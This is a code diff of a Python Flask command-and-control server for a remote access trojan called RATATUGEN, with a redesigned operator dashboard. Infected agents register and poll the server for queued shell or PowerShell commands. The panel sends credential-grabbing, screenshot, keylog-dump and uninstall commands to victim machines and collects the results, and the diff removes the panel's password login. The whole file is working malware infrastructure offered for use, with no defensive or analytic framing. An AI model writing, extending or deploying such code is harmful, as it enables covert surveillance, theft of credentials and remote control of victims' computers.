@@ -1,186 +1,173 @@
 """
-RATATUGEN Web C2 Server
+RATATUGEN C2 Server
+Dashboard: NEXUS-style design
 """
-from flask import Flask, request, render_template_string, redirect, session
-import time
+from flask import Flask, request, Response
+import time, json
 
 app = Flask(__name__)
-app.secret_key = "ratatugen_c2_secret_2026"
-ADMIN_PASSWORD = "ratatugen2026"
 
 clients, commands, results, message_log = {}, {}, {}, []
 
-STYLE = """
+# ---- Dashboard HTML (NEXUS-inspired) ----
+DASH = r'''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>RATATUGEN C2</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&family=Fira+Code:wght@400;600&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:20px;min-height:100vh}
-::selection{background:#e00;color:#fff}
-h1{background:linear-gradient(135deg,#e00,#f44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:24px;margin-bottom:5px;letter-spacing:-0.5px}
-.topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
-.topbar .links a{color:#888;text-decoration:none;font-size:12px;margin-left:15px;padding:5px 10px;border-radius:4px;transition:.2s}
-.topbar .links a:hover{background:#1a1a1a;color:#fff}
-.broadcast{display:flex;gap:8px;background:#111;padding:12px;border-radius:8px;margin-bottom:15px;border:1px solid #222;flex-wrap:wrap}
-.broadcast select{background:#000;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:6px;font-size:13px;min-width:120px;outline:none;cursor:pointer}
-.broadcast select:focus{border-color:#c00}
-.broadcast input{background:#000;border:1px solid #333;color:#fff;padding:8px 12px;border-radius:6px;flex:1;min-width:200px;font-size:13px;outline:none;font-family:monospace}
-.broadcast input:focus{border-color:#c00}
-.broadcast button{background:#c00;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:600;font-size:12px;transition:.15s;white-space:nowrap}
-.broadcast button:hover{background:#f22;transform:translateY(-1px)}
-.agents{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:12px}
-.card{background:#111;border:1px solid #222;border-radius:10px;padding:16px;transition:.2s;position:relative;overflow:hidden}
-.card:hover{border-color:#333}
-.card .status{position:absolute;top:12px;right:14px;font-size:11px;padding:3px 10px;border-radius:20px;font-weight:600;letter-spacing:.5px}
-.card .status.online{background:#0a3;color:#fff;box-shadow:0 0 12px rgba(0,170,50,.3)}
-.card .status.offline{background:#222;color:#666}
-.card h3{font-size:15px;margin-bottom:4px;color:#fff;font-family:monospace}
-.card .meta{font-size:11px;color:#666;margin-bottom:10px;display:flex;gap:15px;flex-wrap:wrap}
-.card .meta span{display:flex;align-items:center;gap:4px}
-.card .actions{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
-.card .actions button{background:#1a1a1a;color:#ccc;border:1px solid #333;padding:6px 12px;border-radius:5px;cursor:pointer;font-size:11px;font-weight:500;transition:.15s}
-.card .actions button:hover{background:#c00;border-color:#c00;color:#fff}
-.card .actions button.kill{background:#1a1a1a;color:#c00;border-color:#333}
-.card .actions button.kill:hover{background:#c00;color:#fff}
-.card input.cmdline{width:100%;background:#000;border:1px solid #333;color:#fff;padding:7px 10px;border-radius:5px;font-size:12px;font-family:monospace;margin-bottom:6px;outline:none}
-.card input.cmdline:focus{border-color:#c00}
-.card pre{background:#000;border:1px solid #1a1a1a;border-radius:6px;padding:10px;margin-top:8px;max-height:180px;overflow-y:auto;font-size:11px;color:#aaa;line-height:1.5;white-space:pre-wrap;word-break:break-all}
-.card pre b{color:#c00}
-.activity{background:#111;border:1px solid #222;border-radius:10px;padding:15px;margin-top:20px}
-.activity h2{font-size:16px;color:#c00;margin-bottom:10px}
-.activity .entry{font-size:11px;padding:4px 0;border-bottom:1px solid #111;display:flex;gap:10px}
-.activity .entry span{color:#555;min-width:130px}
-.activity .entry b{color:#c00;min-width:100px;font-family:monospace}
-.empty{text-align:center;padding:60px 20px;color:#444;font-size:14px}
-"""
-
-LOGIN = '<!DOCTYPE html><html><head><title>RATATUGEN C2</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>' + STYLE + \
-    '</style></head><body style="display:flex;justify-content:center;align-items:center;height:100vh">' \
-    '<div style="text-align:center"><h1 style="font-size:32px">RATATUGEN C2</h1>' \
-    '<form method="POST" style="margin-top:25px">' \
-    '<input type="password" name="password" placeholder="Password" style="background:#111;border:1px solid #333;color:#fff;padding:10px 20px;border-radius:6px;width:250px;font-size:14px;text-align:center;outline:none"><br><br>' \
-    '<button type="submit" style="background:#c00;color:#fff;border:none;padding:10px 30px;border-radius:6px;cursor:pointer;font-weight:700;font-size:14px;width:250px">Login</button>' \
-    '</form></div></body></html>'
-
-DASH = '''<!DOCTYPE html><html><head><title>RATATUGEN C2</title>
-<meta name="viewport" content="width=device-width,initial-scale=1"><style>''' + STYLE + '''</style>
+body{font-family:'Inter',sans-serif;background:#0a0a0f;color:#f1f5f9;min-height:100vh;overflow-x:hidden}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:#12121a}
+::-webkit-scrollbar-thumb{background:#c00;border-radius:3px}
+canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
+.header{position:relative;z-index:10;padding:20px 40px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1e293b;background:rgba(10,10,15,.8);backdrop-filter:blur(20px);flex-wrap:wrap;gap:10px}
+.logo{font-size:28px;font-weight:900;background:linear-gradient(135deg,#e00,#f44);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.header-right{display:flex;align-items:center;gap:20px;font-size:13px;color:#94a3b8}
+.stats{position:relative;z-index:10;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;padding:24px 40px}
+.stat-card{background:#1a1a2e;border:1px solid #1e293b;border-radius:12px;padding:20px;transition:.3s}
+.stat-card:hover{border-color:#c00}
+.stat-label{font-size:11px;text-transform:uppercase;letter-spacing:2px;color:#64748b;margin-bottom:8px}
+.stat-value{font-size:32px;font-weight:700;background:linear-gradient(135deg,#e00,#f44);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.main{position:relative;z-index:10;padding:0 40px 40px}
+.section-title{font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:2px;color:#64748b;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+.section-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,#1e293b,transparent)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px;margin-bottom:20px}
+.card{background:#1a1a2e;border:1px solid #1e293b;border-radius:12px;padding:20px;cursor:pointer;transition:.3s;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,#e00,#f44);opacity:0;transition:.3s}
+.card:hover,.card.sel{border-color:#c00;box-shadow:0 0 20px rgba(200,0,0,.15);transform:translateY(-2px)}
+.card:hover::before,.card.sel::before{opacity:1}
+.ch{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.cid{font-family:'Fira Code',monospace;font-size:13px;font-weight:600;color:#e00}
+.cstat{font-size:10px;text-transform:uppercase;letter-spacing:1px;padding:4px 10px;border-radius:20px;font-weight:600}
+.cstat.online{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3)}
+.cstat.offline{background:rgba(100,100,100,.15);color:#666;border:1px solid rgba(100,100,100,.3)}
+.chost{font-size:16px;font-weight:600}
+.cdet{font-size:12px;color:#94a3b8;font-family:'Fira Code',monospace;margin:2px 0}
+.cfoot{margin-top:12px;padding-top:12px;border-top:1px solid #1e293b;display:flex;justify-content:space-between;font-size:11px;color:#64748b}
+.actions{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.btn{padding:7px 14px;border:1px solid #1e293b;border-radius:8px;background:#12121a;color:#f1f5f9;cursor:pointer;font-size:11px;font-weight:500;transition:.2s}
+.btn:hover{border-color:#c00;color:#fff}
+.btn-run{background:linear-gradient(135deg,#e00,#f44);border:none;color:#fff;font-weight:600}
+.btn-run:hover{box-shadow:0 0 15px rgba(200,0,0,.3)}
+.btn-kill{border-color:#c00;color:#c00}
+.btn-kill:hover{background:rgba(200,0,0,.15)}
+.cmd-in{flex:1;padding:7px 12px;background:#12121a;border:1px solid #1e293b;border-radius:8px;color:#f1f5f9;font-family:'Fira Code',monospace;font-size:12px;outline:none;min-width:120px}
+.cmd-in:focus{border-color:#c00}
+.output{background:#000;border:1px solid #1e293b;border-radius:8px;padding:12px;margin-top:8px;max-height:250px;overflow-y:auto;font-family:'Fira Code',monospace;font-size:11px;white-space:pre-wrap;color:#aaa;line-height:1.5}
+.log-section{margin-top:20px}
+.log-entry{font-size:11px;padding:3px 0;border-bottom:1px solid #0a0a0f;color:#666;font-family:'Fira Code',monospace}
+.log-entry b{color:#c00}
+.no-agents{text-align:center;padding:60px;color:#444;font-size:14px;grid-column:1/-1}
+</style></head><body>
+<canvas id="c"></canvas>
+<div class="header"><div class="logo">RATATUGEN C2</div>
+<div class="header-right"><span id="clock"></span><span>|</span><span id="agent-count">0 agents</span></div></div>
+<div class="stats">
+<div class="stat-card"><div class="stat-label">Agents Online</div><div class="stat-value" id="st-agents">0</div></div>
+<div class="stat-card"><div class="stat-label">Commands Sent</div><div class="stat-value" id="st-cmds">0</div></div>
+<div class="stat-card"><div class="stat-label">Results Received</div><div class="stat-value" id="st-results">0</div></div>
+</div>
+<div class="main">
+<div class="section-title">CONNECTED AGENTS</div>
+<div class="grid" id="grid"><div class="no-agents">Waiting for agents...</div></div>
+<div class="section-title">ACTIVITY LOG</div>
+<div class="output log-section" id="log">No activity yet.</div>
+</div>
 <script>
-function g(u){window.location=u}
-function c(i,d){g('/cmd?client='+i+'&cmd='+encodeURIComponent(d))}
-function s(i){g('/cmd?client='+i+'&cmd='+encodeURIComponent(document.getElementById('sh_'+i).value))}
-setTimeout(function(){location.reload()},15000)
-</script></head><body>
-<div class="topbar">
-<h1>RATATUGEN C2</h1>
-<div class="links"><span style="color:#666;font-size:12px">{{clients|length}} agent{{'s' if clients|length!=1}}</span><a href="/logout">Logout</a></div>
-</div>
+var c=document.getElementById('c'),x=c.getContext('2d'),pts=[],sel=null,w=0,h=0;
+function rs(){w=c.width=innerWidth;h=c.height=innerHeight}
+rs();addEventListener('resize',rs);
+for(var i=0;i<50;i++)pts.push({x:Math.random()*1920,y:Math.random()*1080,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,s:Math.random()*2+.5});
+function dr(){x.clearRect(0,0,w,h);pts.forEach(function(p){p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=w;if(p.x>w)p.x=0;if(p.y<0)p.y=h;if(p.y>h)p.y=0;x.beginPath();x.arc(p.x,p.y,p.s,0,Math.PI*2);x.fillStyle='rgba(200,0,0,'+(p.s/3)+')';x.fill()});for(var i=0;i<pts.length;i++)for(var j=i+1;j<pts.length;j++){var dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<120){x.beginPath();x.moveTo(pts[i].x,pts[i].y);x.lineTo(pts[j].x,pts[j].y);x.strokeStyle='rgba(200,0,0,'+(.04*(1-d/120))+')';x.lineWidth=.5;x.stroke()}}requestAnimationFrame(dr)}
+dr();setInterval(function(){document.getElementById('clock').textContent=new Date().toLocaleTimeString()},1000);
 
-<div class="broadcast">
-<form action="/cmd" method="GET" style="display:flex;gap:8px;flex:1;flex-wrap:wrap">
-<select name="client"><option value="*">ALL AGENTS</option>{% for c in clients %}<option value="{{c}}">{{c}}</option>{% endfor %}</select>
-<input name="cmd" placeholder="Command (cmd / powershell)">
-<button>Run</button>
-</form>
-</div>
+var data={};
+function fetchAll(){
+ fetch('/api/all').then(function(r){return r.json()}).then(function(d){
+  data=d;render();}).catch(function(){});
+}
+function render(){
+ var g=document.getElementById('grid'),ids=Object.keys(data.clients||{});
+ document.getElementById('st-agents').textContent=ids.length;
+ document.getElementById('st-cmds').textContent=data.total_cmds||0;
+ document.getElementById('st-results').textContent=data.total_results||0;
+ document.getElementById('agent-count').textContent=ids.length+' agent'+(ids.length!=1?'s':'');
+ if(!ids.length){g.innerHTML='<div class="no-agents">Waiting for agents...</div>';}
+ else g.innerHTML=ids.map(function(id){
+  var c=data.clients[id]||{},on=c.online||false,ago=Math.floor((Date.now()/1000-(c._last||0)));
+  var out='';if(data.results&&data.results[id]){var rs=data.results[id];if(rs.length)out='<div class="output">'+rs.slice(-3).reverse().map(function(r){return'<b>'+r[0]+'</b> > '+r[1]+'\n'+r[2]}).join('\n')+'</div>';}
+  return '<div class="card'+(sel===id?' sel':'')+'" onclick="select(\''+id+'\')">'+
+  '<div class="ch"><div class="cid">'+id+'</div><div class="cstat '+(on?'online':'offline')+'">'+(on?'ONLINE':'OFFLINE')+'</div></div>'+
+  '<div class="chost">'+(c.pc||'?')+'</div>'+
+  '<div class="cdet">User: '+(c.user||'?')+'</div>'+
+  '<div class="cdet">Last: '+(c.last||'- ')+(ago<60?' ('+ago+'s ago)':'')+'</div>'+
+  '<div class="actions" onclick="event.stopPropagation()">'+
+  '<input class="cmd-in" id="sh_'+id+'" placeholder="cmd / powershell" onkeydown="if(event.key===\'Enter\')send(\''+id+'\')">'+
+  '<button class="btn btn-run" onclick="send(\''+id+'\')">Shell</button>'+
+  '<button class="btn" onclick="cmd(\''+id+'\',\'GRAB_ALL\')">Grab</button>'+
+  '<button class="btn" onclick="cmd(\''+id+'\',\'SCREENSHOT\')">SS</button>'+
+  '<button class="btn" onclick="cmd(\''+id+'\',\'KEYLOG_DUMP\')">Keys</button>'+
+  '<button class="btn btn-kill" onclick="cmd(\''+id+'\',\'UNINSTALL\')">Kill</button></div>'+out+'</div>';
+ }).join('');
 
-<div class="broadcast" style="padding:8px 12px;gap:6px">
-<form action="/cmd" method="GET" style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
-<select name="client"><option value="*">ALL</option>{% for c in clients %}<option value="{{c}}">{{c}}</option>{% endfor %}</select>
-<button name="cmd" value="GRAB_ALL">Grab All</button>
-<button name="cmd" value="SCREENSHOT">Screenshot</button>
-<button name="cmd" value="KEYLOG_DUMP">Keylog Dump</button>
-<button name="cmd" value="UNINSTALL" style="background:#333;color:#f66">Uninstall</button>
-</form>
-</div>
+ var log=document.getElementById('log'),msgs=(data.log||[]).slice(-50).reverse();
+ log.innerHTML=msgs.length?msgs.map(function(m){return'<div class="log-entry"><b>'+m[0]+'</b> ['+m[1]+'] '+m[2]+'</div>'}).join(''):'No activity yet.';
+}
+function select(id){sel=id;render()}
+function cmd(id,c){fetch('/cmd?client='+id+'&cmd='+encodeURIComponent(c));setTimeout(fetchAll,500)}
+function send(id){var inp=document.getElementById('sh_'+id);if(!inp)return;var v=inp.value.trim();if(!v)return;cmd(id,v);inp.value=''}
+setInterval(fetchAll,3000);fetchAll();
+</script></body></html>'''
 
-{% if not clients %}
-<div class="empty">No agents connected. Deploy the RAT on a target machine to see it here.</div>
-{% endif %}
+@app.route('/')
+def index():
+    return DASH
 
-<div class="agents">
-{% for cid, info in clients.items() %}
-<div class="card">
-<div class="status {{'online' if info.get('online') else 'offline'}}">{{'ONLINE' if info.get('online') else 'OFFLINE'}}</div>
-<h3>{{cid}}</h3>
-<div class="meta"><span>PC: {{info.get("pc","?")}}</span><span>User: {{info.get("user","?")}}</span><span>Last: {{info.get("last","-")}}</span></div>
-<input class="cmdline" id="sh_{{cid}}" placeholder="cmd / powershell" onkeydown="if(event.key==='Enter')s('{{cid}}')">
-<div class="actions">
-<button onclick="s('{{cid}}')">Shell</button>
-<button onclick="c('{{cid}}','GRAB_ALL')">Grab</button>
-<button onclick="c('{{cid}}','SCREENSHOT')">SS</button>
-<button onclick="c('{{cid}}','KEYLOG_DUMP')">Keys</button>
-<button class="kill" onclick="c('{{cid}}','UNINSTALL')">Kill</button>
-</div>
-{% if cid in results and results[cid] %}
-{% for t, cmd, out in results[cid][-3:]|reverse %}
-<pre><b>{{t}}</b> > {{cmd}}
-{{out}}</pre>
-{% endfor %}
-{% endif %}
-</div>
-{% endfor %}
-</div>
-
-<div class="activity"><h2>Activity Log</h2>
-{% for t, cid, text in message_log[-40:]|reverse %}
-<div class="entry"><span>{{t}}</span><b>{{cid}}</b>{{text}}</div>
-{% endfor %}
-</div>
-</body></html>'''
-
-@app.route('/', methods=['GET','POST'])
-def login():
-    if request.method=='POST':
-        if request.form.get('password')==ADMIN_PASSWORD:
-            session['authed']=True;return redirect('/')
-        return LOGIN.replace('Password','Wrong Password')
-    if not session.get('authed'):return LOGIN
-    return dashboard()
-
-@app.route('/logout')
-def logout():
-    session.pop('authed',None);return redirect('/')
-
-def dashboard():
-    now=time.time()
-    for c in list(clients.keys()):
-        clients[c]['online']=(now-clients[c].get('_last',0))<45
-        clients[c]['last']=time.ctime(clients[c].get('_last',0))
-    return render_template_string(DASH,clients=clients,results=results,message_log=message_log)
+@app.route('/api/all')
+def api_all():
+    return {
+        'clients': {cid: {'pc': c.get('pc','?'), 'user': c.get('user','?'), 'last': c.get('last','-'), '_last': c.get('_last',0), 'online': c.get('online',False)} for cid, c in clients.items()},
+        'results': {cid: [(t, cmd, out) for t, cmd, out in res[-5:]] for cid, res in results.items()},
+        'log': [(t, cid, text) for t, cid, text in message_log[-50:]],
+        'total_cmds': sum(len(v) for v in commands.values()) + sum(len(r) for r in results.values()),
+        'total_results': sum(len(r) for r in results.values())
+    }
 
 @app.route('/cmd')
 def cmd():
-    if not session.get('authed'):return redirect('/')
-    cid=request.args.get('client','');command=request.args.get('cmd','')
+    cid = request.args.get('client', '')
+    command = request.args.get('cmd', '')
     if cid and command:
-        commands[cid]=command
-        message_log.append((time.ctime(),cid,'Queued: '+command))
-    return redirect('/')
+        commands[cid] = command
+        message_log.append((time.ctime(), cid, 'CMD: ' + command))
+    return 'ok'
 
-@app.route('/register',methods=['POST'])
+@app.route('/register', methods=['POST'])
 def register():
-    d=request.get_json(silent=True)or{}
-    cid=d.get('id','?')
-    clients[cid]={'pc':d.get('pc','?'),'user':d.get('user','?'),'_last':time.time(),'last':time.ctime(),'online':True}
-    if not any(t for t in message_log[-5:] if 'Online' in t[2] and cid in t[1]):
-        message_log.append((time.ctime(),cid,'Online'))
-    return {'status':'ok'}
+    d = request.get_json(silent=True) or {}
+    cid = d.get('id', '?')
+    clients[cid] = {'pc': d.get('pc','?'), 'user': d.get('user','?'), '_last': time.time(), 'last': time.ctime(), 'online': True}
+    return {'status': 'ok'}
 
-@app.route('/poll',methods=['POST'])
+@app.route('/poll', methods=['POST'])
 def poll():
-    d=request.get_json(silent=True)or{}
-    cid=d.get('id','?')
-    if cid not in clients:clients[cid]={'pc':cid,'user':'?','_last':time.time(),'online':True}
-    clients[cid]['_last']=time.time();clients[cid]['online']=True
-    cmd=commands.pop(cid,None)or commands.pop("*",None)
-    return {'command':cmd or''}
+    d = request.get_json(silent=True) or {}
+    cid = d.get('id', '?')
+    if cid not in clients: clients[cid] = {'pc': cid, 'user': '?', '_last': time.time(), 'online': True}
+    clients[cid]['_last'] = time.time(); clients[cid]['online'] = True
+    cmd = commands.pop(cid, None) or commands.pop("*", None)
+    resp = {'command': cmd or ''}
+    return resp
 
-@app.route('/result',methods=['POST'])
+@app.route('/result', methods=['POST'])
 def result():
-    d=request.get_json(silent=True)or{}
-    cid=d.get('id','?');cmd=d.get('command','');out=d.get('output','')
-    if cid not in results:results[cid]=[]
-    results[cid].append((time.ctime(),cmd,out))
-    if len(results[cid])>20:results[cid]=results[cid][-20:]
-    message_log.append((time.ctime(),cid,'Result: '+cmd))
-    return {'status':'ok'}
+    d = request.get_json(silent=True) or {}
+    cid = d.get('id', '?'); cmd = d.get('command', ''); out = d.get('output', '')
+    if cid not in results: results[cid] = []
+    results[cid].append((time.ctime(), cmd, out))
+    if len(results[cid]) > 20: results[cid] = results[cid][-20:]
+    message_log.append((time.ctime(), cid, 'R: ' + cmd))
+    return {'status': 'ok'}
 
-if __name__=='__main__':
-    app.run(host='0.0.0.0',port=5000)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
